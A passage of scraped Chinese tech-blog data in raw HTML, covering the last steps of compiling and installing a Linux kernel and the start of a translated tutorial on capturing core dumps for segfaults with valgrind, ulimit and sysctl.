id=\"crayon-5b4aa92f3bd84149716771-1\"><span class=\"crayon-v\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">config</span><span class=\"crayon-o\">-</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">config</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd84149716771-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在你有一个配置文件了，输入命令 <code>make menuconfig</code>。该命令将打开一个配置工具（图 1），它可以让你遍历每个可用模块，然后启用或者禁用你需要或者不需要的模块。</p>\n<p><img class=\"aligncenter\" title=\"menuconfig\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/85d2538b3bef4aab8275bb67a3af60de.jpg\" alt=\"menuconfig\"></p>\n<p style=\"text-align: center\"><em>图 1: 运行中的 <code>make menuconfig</code></em></p>\n<p>很有可能你会禁用掉内核中的一个重要部分，所以在 <code>menuconfig</code> 期间小心地一步步进行。如果你对某个选项不确定，不要去管它。或者更好的方法是使用我们拷贝的当前运行的内核的配置文件（因为我们知道它可以工作）。一旦你已经遍历了整个配置列表（它非常长），你就准备好开始编译了。</p>\n<h3 id=\"toc_5\">编译和安装</h3>\n<p>现在是时候去实际地编译内核了。第一步是使用 <code>make</code> 命令去编译。调用 <code>make</code> 命令然后回答必要的问题（图 2）。这些问题取决于你将升级的现有内核以及升级后的内核。相信我，将会有非常多的问题要回答，因此你得预留大量的时间。</p>\n<p><img class=\"aligncenter\" title=\"make\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/a7c1e48ffcfdc5c3e57848eb96230904.jpg\" alt=\"make\"></p>\n<p style=\"text-align: center\"><em>图 2: 回答 <code>make</code> 命令的问题</em></p>\n<p>回答了长篇累牍的问题之后，你就可以用如下的命令安装那些之前启用的模块：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd88148112701\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmake modules_install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd88148112701-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd88148112701-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92f3bd88148112701-1\"><span class=\"crayon-e\">make </span><span class=\"crayon-v\">modules</span><span class=\"crayon-sy\">_</span>install</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd88148112701-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>又来了，这个命令将耗费一些时间，所以要么坐下来看着编译输出，或者去做些其他事（因为编译期间不需要你的输入）。可能的情况是，你想要去进行别的任务（除非你真的喜欢看着终端界面上飞舞而过的输出）。</p>\n<p>现在我们使用这个命令来安装内核：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd8b891900254\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd8b891900254-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd8b891900254-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92f3bd8b891900254-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd8b891900254-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>又一次，另一个将要耗费大量可观时间的命令。事实上，<code>make install</code> 命令将比 <code>make modules_install</code> 命令花费更多的时间。去享用午餐，配置一个路由器，将 Linux 安装在一些服务器上，或者小睡一会吧。</p>\n<h3 id=\"toc_6\">启用内核作为引导</h3>\n<p>一旦 <code>make install</code> 命令完成了，就是时候将内核启用来作为引导。使用这个命令来实现：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd8f705948300\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo update-initramfs -c -k 4.17-rc2\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd8f705948300-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd8f705948300-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92f3bd8f705948300-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">update</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">initramfs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.17</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">rc2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd8f705948300-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>当然，你需要将上述内核版本号替换成你编译完的。当命令执行完毕后，使用如下命令来更新 grub：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd92383137147\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo update-grub\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd92383137147-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd92383137147-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92f3bd92383137147-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">update</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">grub</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd92383137147-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在你可以重启系统并且选择新安装的内核了。</p>\n<h3 id=\"toc_7\">恭喜!</h3>\n<p>你已经编译了一个 Linux 内核！它是一项耗费时间的活动；但是，最终你的 Linux 发行版将拥有一个定制的内核，同时你也将拥有一项被许多 Linux 管理员所倾向忽视的重要技能。</p>\n<p>从 Linux 基金会和 edX 提供的免费 <a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">“Introduction to Linux”</a> 课程来学习更多的 Linux 知识。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114047\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114047votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114047\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114047/", "url_obj_id": "0f3f2c33552a25853e5c09c5da5cf3a9"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "在 Linux 上如何得到一个段错误的核心转储", "create_date": "2018/07/14 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/\">Julia Evans</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9834-1.html\">Linux中国/Stephen</a>   </div><p>本周工作中，我花了整整一周的时间来尝试调试一个段错误。我以前从来没有这样做过，我花了很长时间才弄清楚其中涉及的一些基本事情（获得核心转储、找到导致段错误的行号）。于是便有了这篇博客来解释如何做那些事情！</p>\n<p>在看完这篇博客后，你应该知道如何从“哦，我的程序出现段错误，但我不知道正在发生什么”到“我知道它出现段错误时的堆栈、行号了！ ”。</p>\n<h3 id=\"toc_1\">什么是段错误？</h3>\n<p>“段错误segmentation fault”是指你的程序尝试访问不允许访问的内存地址的情况。这可能是由于：</p>\n<ul>\n<li>试图解引用空指针（你不被允许访问内存地址 <code>0</code>）；</li>\n<li>试图解引用其他一些不在你内存（LCTT 译注：指不在合法的内存地址区间内）中的指针；</li>\n<li>一个已被破坏并且指向错误的地方的 C++ 虚表指针C++ vtable pointer，这导致程序尝试执行没有执行权限的内存中的指令；</li>\n<li>其他一些我不明白的事情，比如我认为访问未对齐的内存地址也可能会导致段错误（LCTT 译注：在要求自然边界对齐的体系结构，如 MIPS、ARM 中更容易因非对齐访问产生段错误）。</li>\n</ul>\n<p>这个“C++ 虚表指针”是我的程序发生段错误的情况。我可能会在未来的博客中解释这个，因为我最初并不知道任何关于 C++ 的知识，并且这种虚表查找导致程序段错误的情况也是我所不了解的。</p>\n<p>但是！这篇博客后不是关于 C++ 问题的。让我们谈论的基本的东西，比如，我们如何得到一个核心转储？</p>\n<h3 id=\"toc_2\">步骤1：运行 valgrind</h3>\n<p>我发现找出为什么我的程序出现段错误的最简单的方式是使用 <code>valgrind</code>：我运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ab7b878989481208081\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvalgrind -v your-program\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878989481208081-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878989481208081-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ab7b878989481208081-1\"><span class=\"crayon-v\">valgrind</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">program</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878989481208081-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这给了我一个故障时的堆栈调用序列。 简洁！</p>\n<p>但我想也希望做一个更深入调查，并找出些 <code>valgrind</code> 没告诉我的信息！ 所以我想获得一个核心转储并探索它。</p>\n<h3 id=\"toc_3\">如何获得一个核心转储</h3>\n<p>核心转储core dump是您的程序内存的一个副本，并且当您试图调试您的有问题的程序哪里出错的时候它非常有用。</p>\n<p>当您的程序出现段错误，Linux 的内核有时会把一个核心转储写到磁盘。 当我最初试图获得一个核心转储时，我很长一段时间非常沮丧，因为 – Linux 没有生成核心转储！我的核心转储在哪里？</p>\n<p>这就是我最终做的事情：</p>\n<ol>\n<li>在启动我的程序之前运行 <code>ulimit -c unlimited</code></li>\n<li>运行 <code>sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code></li>\n</ol>\n<h3 id=\"toc_4\">ulimit：设置核心转储的最大尺寸</h3>\n<p><code>ulimit -c</code> 设置核心转储的最大尺寸。 它往往设置为 0，这意味着内核根本不会写核心转储。 它以千字节为单位。 <code>ulimit</code> 是按每个进程分别设置的 —— 你可以通过运行 <code>cat /proc/PID/limit</code> 看到一个进程的各种资源限制。</p>\n<p>例如这些是我的系统上一个随便一个 Firefox 进程的资源限制：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ab7b878995837362216\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat /proc/6309/limits \r\nLimit                     Soft Limit           Hard Limit           Units     \r\nMax cpu time              unlimited            unlimited            seconds   \r\nMax file size             unlimited            unlimited            bytes     \r\nMax data size             unlimited            unlimited            bytes     \r\nMax stack size            8388608              unlimited            bytes     \r\nMax core file size        0                    unlimited            bytes     \r\nMax resident set          unlimited            unlimited            bytes     \r\nMax processes             30571                30571                processes \r\nMax open files            1024                 1048576              files     \r\nMax locked memory         65536                65536                bytes     \r\nMax address space         unlimited            unlimited            bytes     \r\nMax file locks            unlimited            unlimited            locks     \r\nMax pending signals       30571                30571                signals   \r\nMax msgqueue size         819200               819200               bytes     \r\nMax nice priority         0                    0                    \r\nMax realtime priority     0                    0                    \r\nMax realtime timeout      unlimited            unlimited            us   \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ab7b878995837362216-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ab7b878995837362216-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">6309</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">limits </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ab7b878995837362216-2\"><span class=\"crayon-e\">Limit                     </span><span class=\"crayon-e\">Soft </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Hard </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Units     </span></div><div class=\"crayon-line\" id=\"crayon-5b4ab7b878995837362216-3\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">cpu </span><span class=\"crayon-e\">time              </span><span class=\"crayon-e\">unlimited            </span><span 